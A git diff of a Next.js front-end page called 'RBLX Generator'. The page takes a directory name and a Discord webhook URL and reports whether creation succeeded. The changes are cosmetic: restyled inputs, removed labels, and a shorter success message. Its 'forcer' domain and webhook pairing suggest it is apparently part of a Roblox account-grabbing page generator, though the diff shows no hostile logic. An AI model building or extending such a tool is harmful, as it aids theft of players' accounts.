@@ -26,9 +26,7 @@ export default function Home() {
       const data = await res.json();
 
       if (data.success) {
-        setMessage(
-          `✅ Created successfully! View: https://rblx-forcer.vercel.app/${directory}`
-        );
+        setMessage('✅ Created successfully!');
       } else {
         setMessage(`❌ Error: ${data.error || 'Something went wrong.'}`);
       }
@@ -39,46 +37,40 @@ export default function Home() {
   };
 
   return (
-    <main className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white px-4">
-      <h1 className="text-3xl font-bold mb-6 text-center">RBLX Generator</h1>
+    <main className="flex min-h-screen flex-col items-center justify-center bg-gray-900 text-white p-6">
+      <h1 className="text-3xl font-bold mb-6">RBLX Generator</h1>
 
       <form
         onSubmit={handleSubmit}
-        className="bg-gray-800 p-6 rounded-2xl shadow-md w-full max-w-md flex flex-col gap-4"
+        className="flex flex-col gap-4 w-full max-w-sm bg-gray-800 p-6 rounded-2xl shadow-lg"
       >
-        <label>
-          <span className="block mb-1 font-semibold">Directory Name</span>
-          <input
-            type="text"
-            className="w-full p-2 rounded-md text-black"
-            value={directory}
-            onChange={(e) => setDirectory(e.target.value)}
-            placeholder="example-directory"
-          />
-        </label>
+        <input
+          type="text"
+          placeholder="Enter directory name"
+          value={directory}
+          onChange={(e) => setDirectory(e.target.value)}
+          className="p-3 rounded-lg text-black"
+        />
 
-        <label>
-          <span className="block mb-1 font-semibold">Webhook URL</span>
-          <input
-            type="text"
-            className="w-full p-2 rounded-md text-black"
-            value={webhook}
-            onChange={(e) => setWebhook(e.target.value)}
-            placeholder="https://discord.com/api/webhooks/..."
-          />
-        </label>
+        <input
+          type="text"
+          placeholder="Enter webhook URL"
+          value={webhook}
+          onChange={(e) => setWebhook(e.target.value)}
+          className="p-3 rounded-lg text-black"
+        />
 
         <button
           type="submit"
-          className="bg-blue-600 hover:bg-blue-700 p-2 rounded-md text-white font-semibold transition-all"
+          className="bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
         >
           Generate
         </button>
-
-        {message && (
-          <p className="text-sm text-center text-gray-300 mt-2">{message}</p>
-        )}
       </form>
+
+      {message && (
+        <p className="mt-4 text-sm text-gray-300 text-center">{message}</p>
+      )}
     </main>
   );
-        }
+            }
